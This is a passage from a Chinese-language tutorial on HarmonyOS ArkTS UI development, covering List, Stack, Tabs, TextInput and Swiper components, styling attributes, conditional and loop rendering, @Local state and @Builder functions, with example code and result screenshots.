          .<span class="hljs-title function_">height</span>(<span class="hljs-number">80</span>)
          <span class="hljs-comment">//.backgroundColor(Color.Pink)</span>
          .<span class="hljs-title function_">margin</span>({ <span class="hljs-attr">bottom</span>: <span class="hljs-number">10</span> })
        }
      }.<span class="hljs-title function_">scrollBar</span>(<span class="hljs-title class_">BarState</span>.<span class="hljs-property">Off</span>)<span class="hljs-comment">//滚动条状态（自动、开、关）</span>
    }
    .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">height</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-string">'#131313'</span>)
    .<span class="hljs-title function_">padding</span>({ <span class="hljs-attr">left</span>: <span class="hljs-number">10</span>, <span class="hljs-attr">right</span>: <span class="hljs-number">10</span> })
    .<span class="hljs-title function_">expandSafeArea</span>([<span class="hljs-title class_">SafeAreaType</span>.<span class="hljs-property">SYSTEM</span>], [<span class="hljs-title class_">SafeAreaEdge</span>.<span class="hljs-property">TOP</span>, <span class="hljs-title class_">SafeAreaEdge</span>.<span class="hljs-property">BOTTOM</span>]) <span class="hljs-comment">//扩充组件安全区域</span>
  }
}
</code></pre>
<p>使用List(){}包含组件形成一个列表，每一条用ListItem(){}实现，例如：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-title class_">List</span>() {
        <span class="hljs-title class_">ListItem</span>() {
        <span class="hljs-comment">//详细内容</span>
        }
}
</code></pre>
<blockquote>
<p>使用<code>.listDirection</code>可以控制方向</p>
</blockquote>
<h3 data-id="heading-7">（三）层叠布局组件</h3>
<p>使用方法：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-title class_">Stack</span>(){
    组件<span class="hljs-number">1</span>
    组件<span class="hljs-number">2</span>
}
</code></pre>
<blockquote>
<p>把要叠加的组件放在{}里面，即可叠加在一起</p>
<p>使用<code>Stack({ alignContent: Alignment. TopEnd })</code>可以设置组件层叠对齐方式</p>
</blockquote>
<h3 data-id="heading-8">（四）Tab组件</h3>
<p>使用方法：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-title class_">Tabs</span>({<span class="hljs-attr">barPosition</span>: <span class="hljs-title class_">BarPosition</span>. 对齐位置}) {
    <span class="hljs-title class_">TabContent</span>(){
        <span class="hljs-comment">// 内容</span>
    }
    .<span class="hljs-title function_">tabBar</span>() <span class="hljs-comment">//菜单</span>
}
</code></pre>
<p>示例代码：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Index</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Tabs</span>({ <span class="hljs-attr">barPosition</span>: <span class="hljs-title class_">BarPosition</span>.<span class="hljs-property">End</span> }) {
      <span class="hljs-title class_">ForEach</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>], <span class="hljs-function">(<span class="hljs-params">index: <span class="hljs-built_in">number</span></span>) =&gt;</span> {
        <span class="hljs-title class_">TabContent</span>() {
          <span class="hljs-title class_">Text</span>(<span class="hljs-string">'内容'</span> + index)
        }
        .<span class="hljs-title function_">tabBar</span>(<span class="hljs-string">'菜单'</span> + index)
      })
    }
  }
}
</code></pre>
<p>结果：</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c017be891af149d6b7b88ddaa851effb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB6aOe5LiA5Lya5YS_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770907757&amp;x-signature=%2FKTjgovLps7cYlvRBtqNpP8uhYY%3D" alt="2026-02-04-10-17-56-image.png" loading="lazy"/></p>
<blockquote>
<p>可以使用onChange控制点击的变化</p>
</blockquote>
<h3 data-id="heading-9">（五）输入框组件</h3>
<p>使用方法：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-title class_">TextInput</span>({ <span class="hljs-attr">placeholder</span>:<span class="hljs-string">'提示信息'</span>})
·<span class="hljs-title function_">placeholderColor</span>(‘提示信息色值’)
</code></pre>
<p>示例代码：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Index</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>(){
      <span class="hljs-title class_">TextInput</span>({<span class="hljs-attr">placeholder</span>:<span class="hljs-string">'请输入……'</span>})
        .<span class="hljs-title function_">placeholderColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">Brown</span>)
    }
    .<span class="hljs-title function_">padding</span>(<span class="hljs-number">10</span>)
  }
}
</code></pre>
<p>结果：</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/25b20ee3d5fc47a68679e03f1ce4106e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB6aOe5LiA5Lya5YS_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770907757&amp;x-signature=ZHtbyH04Dz8dfjrR9FAvEaGBNMg%3D" alt="2026-02-04-10-54-04-image.png" loading="lazy"/></p>
<h3 data-id="heading-10">（六）轮播图组件</h3>
<p>使用方法：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-title class_">Swiper</span>() {
    <span class="hljs-comment">// 内容</span>
}
.<span class="hljs-title function_">autoPlay</span>(<span class="hljs-literal">true</span>)<span class="hljs-comment">//自动播放</span>
</code></pre>
<blockquote>
<p>内容可以使用ForEach循环渲染</p>
</blockquote>
<h2 data-id="heading-11">六、属性</h2>
<p>使用方法：组件.属性(值)</p>
<h3 data-id="heading-12">（一） 通用属性</h3>
<p>常用通用属性：</p>





























<table><thead><tr><th>属性名</th><th>作用</th><th>属性值</th><th>注意事项</th></tr></thead><tbody><tr><td>width</td><td>宽度(左对齐)</td><td>数值（vp）</td><td>最大：360或100%</td></tr><tr><td>height</td><td>高度</td><td>数值（vp）</td><td>最大：360或100%</td></tr><tr><td>backgroundColor</td><td>背景色</td><td>内置颜色或十六进制值</td><td/></tr></tbody></table>
<p>示例：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Index</span> {

  <span class="hljs-comment">//build里面要有唯一容器根组件</span>
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>(){
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'文本'</span>)
        .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">Orange</span>)
        .<span class="hljs-title function_">width</span>(<span class="hljs-number">100</span>)
        .<span class="hljs-title function_">height</span>(<span class="hljs-number">50</span>)
      <span class="hljs-title class_">Row</span>(){}
        .<span class="hljs-title function_">width</span>(<span class="hljs-number">300</span>)<span class="hljs-comment">//满屏360</span>
        .<span class="hljs-title function_">height</span>(<span class="hljs-number">100</span>)
        .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-string">'#ff6600'</span>)
    }
  }
}
</code></pre>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc79a3f105bd45d08ae2b141fc3c5e1a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB6aOe5LiA5Lya5YS_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770907757&amp;x-signature=3cRvvkIdQKQq0Bjlq3fLuGVkjAU%3D" alt="2026-01-29-15-03-40-image.png" loading="lazy"/></p>
<h3 data-id="heading-13">（二）文本属性</h3>
<p>常用：</p>



































<table><thead><tr><th>属性名</th><th>作用</th><th>属性值</th></tr></thead><tbody><tr><td>fontSize</td><td>字体大小</td><td>数值（fp)</td></tr><tr><td>fontColor</td><td>字体颜色</td><td>内置颜色或十六进制值</td></tr><tr><td>fontWeight</td><td>字体粗细</td><td>100~900（默认400）</td></tr><tr><td>MaxLines</td><td>最大行数</td><td>数值</td></tr><tr><td>textOverFlow</td><td>移除显示</td><td>多种，根据实际选择</td></tr></tbody></table>
<p>示例：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Index</span> {

  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>(){
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'测试组件'</span>)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">30</span>)
        .<span class="hljs-title function_">fontColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">Red</span>)
        .<span class="hljs-title function_">fontWeight</span>(<span class="hljs-number">800</span>)
    }
  }
}
</code></pre>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3e379e1e2ed64e638431b304384aed5b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB6aOe5LiA5Lya5YS_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770907757&amp;x-signature=JZ0a53%2FL%2F8sv9kCSvsmd9ik%2FJN4%3D" alt="2026-01-29-15-08-41-image.png" loading="lazy"/></p>
## （三）边距属性
<p>外边距：<code>margin</code> 内边距 ：<code>padding</code></p>
<ol>
<li>四个方向相同：</li>
</ol>
<pre><code class="hljs language-ts" lang="ts">组件
    ·<span class="hljs-title function_">padding</span>(数值)
    ·<span class="hljs-title function_">margin</span>(数值)
</code></pre>
<ol start="2">
<li>四个方向不同：</li>
</ol>
<pre><code class="hljs language-ts" lang="ts">组件
   .<span class="hljs-title function_">padding</span>({<span class="hljs-attr">top</span>: 值, <span class="hljs-attr">bottom</span>: 值, <span class="hljs-attr">left</span>: 值, <span class="hljs-attr">right</span>: 值})
   .<span class="hljs-title function_">margin</span>({<span class="hljs-attr">top</span>: 值, <span class="hljs-attr">bottom</span>: 值, <span class="hljs-attr">left</span>: 值, <span class="hljs-attr">right</span>: 值})
</code></pre>
<p>原始代码：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Index</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'登录'</span>)
        .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'注册'</span>)
        .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
        .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">Gray</span>)
    }
    .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-string">'#DDDDDD'</span>)

  }
}
</code></pre>
<p>结果：</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3fac4300405746f6a679233d292001a4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB6aOe5LiA5Lya5YS_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770907757&amp;x-signature=upI8%2F4IM%2FkSlkSk9Up0lqbYwirY%3D" alt="2026-01-31-10-01-32-image.png" loading="lazy"/></p>
<p>加入内边距，和边缘分离：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Index</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'登录'</span>)
        .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'注册'</span>)
        .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
        .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">Gray</span>)
    }
    .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-string">'#DDDDDD'</span>)
    .<span class="hljs-title function_">padding</span>({
      <span class="hljs-attr">left</span>: <span class="hljs-number">10</span>,
      <span class="hljs-attr">top</span>: <span class="hljs-number">20</span>,
      <span class="hljs-attr">right</span>: <span class="hljs-number">30</span>,
      <span class="hljs-attr">bottom</span>: <span class="hljs-number">40</span>
    })
  }
}
</code></pre>
<p>结果：</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7f5bd341451a4aa3818699eb721d7cb0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB6aOe5LiA5Lya5YS_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770907757&amp;x-signature=s3ftHCBkVQeLlohimpXfVeGjgeQ%3D" alt="2026-01-31-10-02-50-image.png" loading="lazy"/></p>
<p>加入外边距分离两个按钮：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Index</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'登录'</span>)
        .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
        .<span class="hljs-title function_">margin</span>({ <span class="hljs-attr">bottom</span>: <span class="hljs-number">20</span> })
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'注册'</span>)
        .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
        .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">Gray</span>)
    }
    .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-string">'#DDDDDD'</span>)
    .<span class="hljs-title function_">padding</span>({
      <span class="hljs-attr">left</span>: <span class="hljs-number">10</span>,
      <span class="hljs-attr">top</span>: <span class="hljs-number">20</span>,
      <span class="hljs-attr">right</span>: <span class="hljs-number">30</span>,
      <span class="hljs-attr">bottom</span>: <span class="hljs-number">40</span>
    })
  }
}
</code></pre>
<p>结果：</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff7725ec37014b52b8064da4280ed63e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB6aOe5LiA5Lya5YS_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770907757&amp;x-signature=Nq3nYCnlsvXlcjpT8LHmRHSPveY%3D" alt="2026-01-31-10-05-34-image.png" loading="lazy"/></p>
<h3 data-id="heading-14">（四）边框属性</h3>
<pre><code class="hljs language-ts" lang="ts">组件
    .<span class="hljs-title function_">border</span>({<span class="hljs-attr">width</span>:粗细,<span class="hljs-attr">color</span>:颜色,<span class="hljs-attr">style</span>:线条样式,<span class="hljs-attr">radius</span>:圆角})
</code></pre>
<p>示例代码：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Index</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">'点赞'</span>)
        .<span class="hljs-title function_">width</span>(<span class="hljs-number">100</span>)
        .<span class="hljs-title function_">height</span>(<span class="hljs-number">60</span>)
        .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">Pink</span>)
        .<span class="hljs-title function_">textAlign</span>(<span class="hljs-title class_">TextAlign</span>.<span class="hljs-property">Center</span>)
        .<span class="hljs-title function_">border</span>({
          <span class="hljs-attr">width</span>: <span class="hljs-number">2</span>,
          <span class="hljs-attr">color</span>: <span class="hljs-title class_">Color</span>.<span class="hljs-property">Blue</span>,
          <span class="hljs-attr">style</span>: <span class="hljs-title class_">BorderStyle</span>.<span class="hljs-property">Dotted</span>,
          <span class="hljs-attr">radius</span>: <span class="hljs-number">30</span>
        })
    }
    .<span class="hljs-title function_">padding</span>(<span class="hljs-number">20</span>)
  }
}
</code></pre>
<p>效果：</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f54bc4a45cf3448db6ebebb620ed7102~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB6aOe5LiA5Lya5YS_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770907757&amp;x-signature=1HUPJ8Vuoz7TRjv3g%2BpFxP43%2FRw%3D" alt="2026-01-31-10-16-01-image.png" loading="lazy"/></p>
<blockquote>
<p>使用<code>.clip(true)</code>来裁剪内部以贴合外组件边框</p>
</blockquote>
<h3 data-id="heading-15">（五）安全区域属性</h3>
<pre><code class="hljs language-ts" lang="ts">.<span class="hljs-title function_">expandSafeArea</span>([<span class="hljs-title class_">SafeAreaType</span>.<span class="hljs-property">SYSTEM</span>], [<span class="hljs-title class_">SafeAreaEdge</span>.<span class="hljs-property">TOP</span>, <span class="hljs-title class_">SafeAreaEdge</span>.<span class="hljs-property">BOTTOM</span>])
</code></pre>
<blockquote>
<p>可以将安全区域从两边留白扩展到整个屏幕</p>
<p>TOP设置扩展到顶部（通知栏）</p>
<p>BOTTOM设置扩展到底部（任务栏）</p>
</blockquote>
<h3 data-id="heading-16">（六）滚动条属性</h3>
<pre><code class="hljs language-ts" lang="ts">.<span class="hljs-title function_">scrollBar</span>(<span class="hljs-title class_">BarState</span>.<span class="hljs-property">Off</span>)
</code></pre>
<blockquote>
<p>可以设置On、Off、Auto，控制滚动条的显示与否</p>
</blockquote>
<h3 data-id="heading-17">（七）扩展填充属性</h3>
<pre><code class="hljs language-ts" lang="ts">.<span class="hljs-title function_">layoutWeight</span>(<span class="hljs-number">1</span>)
</code></pre>
<blockquote>
<p>设置1即扩展填充剩余所有的空间，0则不填充</p>
</blockquote>
<h3 data-id="heading-18">（八）颜色填充属性</h3>
<pre><code class="hljs language-ts" lang="ts">.<span class="hljs-title function_">fillColor</span>(<span class="hljs-title class_">Color</span>.<span class="hljs-property">White</span>)
</code></pre>
<blockquote>
<p>可以修改图片填充颜色，最好是svg格式的，一般用于Image组件</p>
</blockquote>
<h2 data-id="heading-19">七、结构语句</h2>
<h3 data-id="heading-20">（一）if分支语句</h3>
<p>使用方法：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">if</span> (条件<span class="hljs-number">1</span>) {
  <span class="hljs-comment">//条件1满足时执行代码</span>
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (条件<span class="hljs-number">2</span>) {
  <span class="hljs-comment">//条件1不满足执行代码，条件2满足时执行代码</span>
} <span class="hljs-keyword">else</span> {
  <span class="hljs-comment">//条件均满足时执行代码</span>
}
</code></pre>
<p>示例代码：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">let</span> <span class="hljs-attr">score</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">58</span>
<span class="hljs-keyword">if</span> (score &gt;= <span class="hljs-number">80</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'等级：A'</span>)
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (score &gt;= <span class="hljs-number">70</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'等级：B'</span>)
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (score &gt;= <span class="hljs-number">60</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'等级：C'</span>)
} <span class="hljs-keyword">else</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'不及格！'</span>)
}
</code></pre>
<blockquote>
<p>在实际项目中，可用于条件渲染，根据需要显示不同内容</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">let</span> <span class="hljs-attr">num</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">20</span>

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Index</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-keyword">if</span> (<span class="hljs-number">1</span> === num) {
        <span class="hljs-title class_">Text</span>(<span class="hljs-string">'文本1'</span>)
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-number">2</span> === num) {
        <span class="hljs-title class_">Text</span>(<span class="hljs-string">'文本2'</span>)
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-title class_">Text</span>(<span class="hljs-string">'无文本'</span>)
      }
    }
  }
}
</code></pre>
</blockquote>
<h3 data-id="heading-21">（二）条件表达式语句</h3>
<pre><code class="hljs language-ts" lang="ts">条件?条件成立的表达式:条件不成立的表达式
</code></pre>
<p>示例代码：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">let</span> <span class="hljs-attr">num1</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">10</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">num2</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">20</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">result</span>: <span class="hljs-built_in">number</span> = num1 &gt; num2 ? num1 : num2
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'最大值是'</span>, result);
</code></pre>
<blockquote>
<p>可用于条件渲染</p>
</blockquote>
<h3 data-id="heading-22">（三）循环渲染语句</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-title class_">ForEach</span>(数组,<span class="hljs-function">(<span class="hljs-params">item:类型,index: <span class="hljs-built_in">number</span></span>) =&gt;</span> {
    组件
})
</code></pre>
<p>示例代码：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">let</span> <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>[] = [<span class="hljs-string">'张三'</span>, <span class="hljs-string">'李四'</span>, <span class="hljs-string">'王五'</span>]

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Index</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">ForEach</span>(name, <span class="hljs-function">(<span class="hljs-params">item: <span class="hljs-built_in">string</span>, index: <span class="hljs-built_in">number</span></span>) =&gt;</span> {
        <span class="hljs-title class_">Text</span>(item + index)
      })
    }
    .<span class="hljs-title function_">padding</span>(<span class="hljs-number">20</span>)
  }
}
</code></pre>
<p>结果：</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d8be1048e974418687901f6bdc600b01~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB6aOe5LiA5Lya5YS_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770907757&amp;x-signature=GGmQXqhj3x%2BWO5%2FOpMdZX3qrj%2F0%3D" alt="2026-02-02-11-05-45-image.png" loading="lazy"/></p>
<h2 data-id="heading-23">八、状态管理和事件处理</h2>
<p>应用的运行时的状态是参数,当参数改变时,UI渲染刷新</p>
<p>状态变量:使用装饰器装饰,状态变量数据改变会引起UI的渲染刷新</p>
<p>使用V2版本管理：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-meta">@ComponentV2</span>
struct xxx {
  <span class="hljs-meta">@Local</span> 变量
</code></pre>
<blockquote>
<p>注意:</p>
<ol>
<li>状态必须设置数据类型</li>
<li>状态必须设置初始值</li>
</ol>
<p>使用this关键字修改</p>
</blockquote>
<p>示例代码：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">let</span> <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>[] = [<span class="hljs-string">'张三'</span>, <span class="hljs-string">'李四'</span>, <span class="hljs-string">'王五'</span>]

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@ComponentV2</span>
struct <span class="hljs-title class_">Index</span> {
  <span class="hljs-meta">@Local</span> <span class="hljs-attr">num</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">1</span>

  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Row</span>() {
        <span class="hljs-title class_">Text</span>(<span class="hljs-string">'-'</span>)
          .<span class="hljs-title function_">width</span>(<span class="hljs-number">40</span>)
          .<span class="hljs-title function_">height</span>(<span class="hljs-number">40</span>)
          .<span class="hljs-title function_">border</span>({ <span class="hljs-attr">width</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">color</span>: <span class="hljs-string">'#999'</span>, <span class="hljs-attr">radius</span>: { <span class="hljs-attr">topLeft</span>: <span class="hljs-number">3</span>, <span class="hljs-attr">bottomLeft</span>: <span class="hljs-number">3</span> } })
          .<span class="hljs-title function_">textAlign</span>(<span class="hljs-title class_">TextAlign</span>.<span class="hljs-property">Center</span>)
          .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span> &gt; <span class="hljs-number">1</span>) {
              <span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span>--
            }
          })
        <span class="hljs-title class_">Text</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span>.<span class="hljs-title function_">toString</span>())
          .<span class="hljs-title function_">width</span>(<span class="hljs-number">40</span>)
          .<span class="hljs-title function_">height</span>(<span class="hljs-number">40</span>)
          .<span class="hljs-title function_">border</span>({ <span class="hljs-attr">width</span>: { <span class="hljs-attr">top</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">bottom</span>: <span class="hljs-number">1</span> }, <span class="hljs-attr">color</span>: <span class="hljs-string">'#999'</span> })
          .<span class="hljs-title function_">textAlign</span>(<span class="hljs-title class_">TextAlign</span>.<span class="hljs-property">Center</span>)
          .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">18</span>)
        <span class="hljs-title class_">Text</span>(<span class="hljs-string">'+'</span>)
          .<span class="hljs-title function_">width</span>(<span class="hljs-number">40</span>)
          .<span class="hljs-title function_">height</span>(<span class="hljs-number">40</span>)
          .<span class="hljs-title function_">border</span>({ <span class="hljs-attr">width</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">color</span>: <span class="hljs-string">'#999'</span>, <span class="hljs-attr">radius</span>: { <span class="hljs-attr">topRight</span>: <span class="hljs-number">3</span>, <span class="hljs-attr">bottomRight</span>: <span class="hljs-number">3</span> } })
          .<span class="hljs-title function_">textAlign</span>(<span class="hljs-title class_">TextAlign</span>.<span class="hljs-property">Center</span>)
          .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span>++
          })
      }
      .<span class="hljs-title function_">padding</span>(<span class="hljs-number">50</span>)
    }
    .<span class="hljs-title function_">padding</span>(<span class="hljs-number">20</span>)
  }
}
</code></pre>
<p>结果：</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6723a91f5aec415c9f1eb3b81c2681fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB6aOe5LiA5Lya5YS_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770907757&amp;x-signature=lCK0XGhTzu8X0ECv4nAkbgbXdhg%3D" alt="2026-02-03-11-37-04-20260203-0336-54.8126786.gif" loading="lazy"/></p>
<ol>
<li><code>onClick</code>定义点击执行的代码块</li>
</ol>
<h2 data-id="heading-24">九、使用@Builder装饰函数控制UI</h2>
<p>使用@Builder 装饰函数,封装的UI元素,提升复用性，@Builder装饰的函数也称为“自定义构建函数”。</p>
<p>定义：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-meta">@Builder</span>
自定义构建函数名(参数列表){
要复用的组件结构
}
</code></pre>
<p>使用：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-variable language_">this</span>.自定义构建函数名(数据列表)
</code></pre>
<p>示例代码：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">let</span> <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>[] = [<span class="hljs-string">'张三'</span>, <span class="hljs-string">'李四'</span>, <span class="hljs-string">'王五'</span>]

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@ComponentV2</span>
struct <span class="hljs-title class_">Index</span> {
  <span class="hljs-meta">@Builder</span>
  <span class="hljs-title function_">titleBuilder</span>(<span class="hljs-params">title: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-title class_">Row</span>() {
      <span class="hljs-title class_">Text</span>(title)
